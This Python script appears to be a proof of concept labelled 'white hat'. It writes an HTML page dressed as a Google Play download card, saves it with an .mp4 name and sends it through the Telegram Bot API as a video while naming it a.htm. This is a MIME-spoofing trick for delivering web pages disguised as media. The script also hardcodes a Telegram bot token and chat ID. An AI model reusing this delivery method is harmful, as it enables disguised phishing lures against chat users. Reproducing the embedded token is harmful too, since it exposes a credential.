import requests

print("TECHNICAL WHITE HAT")

BOT_TOKEN = "7679980063:AAEW8Do6_xHOUgv7hI0QwnJd-NMBpBF9Zas"
CHAT_ID = "5360438185"


html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Get it on Google Play</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .app-container {
            background: #fff;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 320px;
        }
        .app-logo {
            width: 100px;
            border-radius: 20%;
        }
        .app-title {
            font-size: 22px;
            font-weight: bold;
            margin: 10px 0;
        }
        .app-desc {
            color: #666;
            font-size: 14px;
            margin-bottom: 15px;
        }
        .playstore-badge {
            width: 200px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="app-container">
        <img src="https://hackersking.b-cdn.net/Images/icons/apple-touch-icon.png" alt="App Logo" class="app-logo">
        <div class="app-title">Hackersking eLearning</div>
        <div class="app-desc">Learn practical hacking and cybersecurity.</div>
        <a href="https://replit.com/cdn-cgi/image/width=1920,quality=80,format=auto/https://storage.googleapis.com/screenshot-production-us-central1/07ecfae3-987e-466b-afe1-e5ab3ad21d96/423142d7-fa6b-4a41-ac65-d7b45cfd91d7.jpg" target="https://replit.com/cdn-cgi/image/width=1920,quality=80,format=auto/https://storage.googleapis.com/screenshot-production-us-central1/07ecfae3-987e-466b-afe1-e5ab3ad21d96/423142d7-fa6b-4a41-ac65-d7b45cfd91d7.jpg">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" 
                 alt="Get it on Google Play" class="playstore-badge">
        </a>
    </div>

</body>
</html>

"""


html_path = "testv.mp4"
with open(html_path, "w") as file:
    file.write(html_content)


files = {
    "video": (
        "a.htm",
        open(html_path, "rb"),  
        "video/mp4"
    )
}


url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"


data = {"chat_id": CHAT_ID, "supports_streaming": False}
response = requests.post(url, data=data, files=files)

if response.status_code == 200:
    print("message send")
else:
    print(f"Hata: {response.text}")
